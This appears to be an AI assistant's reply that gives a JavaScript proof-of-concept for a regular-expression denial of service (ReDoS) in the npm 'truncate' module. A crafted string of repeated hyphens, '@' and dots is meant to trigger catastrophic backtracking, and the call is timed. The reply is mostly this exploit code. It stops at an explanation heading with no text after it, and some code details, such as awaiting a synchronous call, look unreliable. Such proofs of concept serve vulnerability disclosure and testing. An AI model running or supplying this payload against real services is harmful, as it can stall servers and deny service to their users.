Here is the complete Proof-of-Concept script along with a technical explanation of why it triggers and proves the vulnerability.

```js
const truncate = require('truncate');

async function exploit() {
    // Payload designed to trigger catastrophic backtracking in URL_REGEX email sub-pattern.
    // The character '-' forces ambiguity between [\w] and [\-] inside nested quantifiers.
    const maliciousInput = '-'.repeat(100) + '@' + '.'.repeat(3);

    console.log('Triggering ReDoS on truncate module...');
    console.time('backtrack-depth');

    // truncate internally runs URL_REGEX.test/match against input strings to detect URLs/emails.
    // When the TLD check ([a-zA-Z]{2,3}) fails, V8 exponentially backtracks over splits of '-'.
    const result = await truncate(maliciousInput, { length: 50 });

    console.timeEnd('backtrack-depth');
    return result;
}

await exploit();
```

### Why This Demonstrates the Vulnerability

